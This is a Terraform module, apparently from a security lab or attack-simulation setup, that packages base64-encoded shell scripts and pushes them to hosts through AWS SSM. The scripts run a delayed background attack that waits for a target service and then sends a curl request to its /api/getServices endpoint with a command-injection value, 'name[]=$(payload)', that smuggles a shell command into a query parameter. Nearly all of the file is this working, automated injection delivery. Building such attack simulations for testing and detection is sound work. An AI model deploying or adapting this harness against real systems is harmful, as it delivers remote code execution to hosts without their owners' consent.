locals {
    attack_dir = "/npm_attack"
    attack_script = "npm_attack.sh"
    start_script = "delayed_start.sh"
    lock_file = "/tmp/delay_npm_attack.lock"
    target_ip=var.target_ip
    target_port=var.target_port
    payload = <<-EOT
    LOCKFILE="${ local.lock_file }"
    if [ -e "$LOCKFILE" ]; then
        echo "Another instance of the script is already running. Exiting..."
        exit 1
    fi
    LOGFILE=/tmp/${var.tag}.log
    function log {
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
    }
    MAXLOG=2
    for i in `seq $((MAXLOG-1)) -1 1`; do mv "$LOGFILE."{$i,$((i+1))} 2>/dev/null || true; done
    mv $LOGFILE "$LOGFILE.1" 2>/dev/null || true
    check_package_manager() {
        pgrep -f "apt" || pgrep -f "dpkg" || pgrep -f "yum" || pgrep -f "rpm"
    }
    while check_package_manager; do
        log "Waiting for package manager to be available..."
        sleep 10
    done

    log "cleaning app directory"
    rm -rf ${local.attack_dir}
    mkdir -p ${local.attack_dir}
    cd ${local.attack_dir}
    echo ${local.delayed_start} | base64 -d > ${local.start_script}
    echo ${local.npm_attack} | base64 -d > ${local.attack_script}

    log "starting background delayed script start..."
    nohup /bin/bash ${local.start_script} >/dev/null 2>&1 &
    log "background job started"
    log "done."
    
    EOT
    base64_payload = base64encode(local.payload)

    delayed_start   = base64encode(templatefile(
                                "${path.module}/resources/${local.start_script}",
                                {
                                    scriptname = "delayed_start_npm_attack"
                                    lock_file = local.lock_file
                                    attack_delay = var.attack_delay
                                    attack_dir = local.attack_dir
                                    attack_script = local.attack_script
                                }
                        ))

    npm_attack           = base64encode(templatefile(
                            "${path.module}/resources/${local.attack_script}",
                            {
                                content =   <<-EOT
                                            log "payload: curl --get --verbose \"http://${local.target_ip}:${local.target_port}/api/getServices\" --data-urlencode 'name[]=\$(${var.payload})'"
                                            log "checking target: ${local.target_ip}:${local.target_port}"
                                            while ! nc -z -w 5 -vv ${local.target_ip} ${local.target_port} > /dev/null; do
                                                log "failed check - waiting for target";
                                                sleep 30;
                                            done;
                                            log "target available - sending payload";
                                            sleep 5;
                                            curl --get --verbose "http://${local.target_ip}:${local.target_port}/api/getServices" --data-urlencode 'name[]=$(${var.payload})' >> $LOGFILE 2>&1;
                                            echo "\n" >> $LOGFILE
                                            log "payload sent sleeping..."
                                            log "done";
                                            EOT
                            }
                    ))
}

###########################
# SSM 
###########################

module "ssm" {
    source          = "../../../../../common/aws/ssm/base"
    environment     = var.environment
    deployment      = var.deployment
    tag             = var.tag
    timeout         = var.timeout
    cron            = var.cron
    base64_payload  = local.base64_payload
}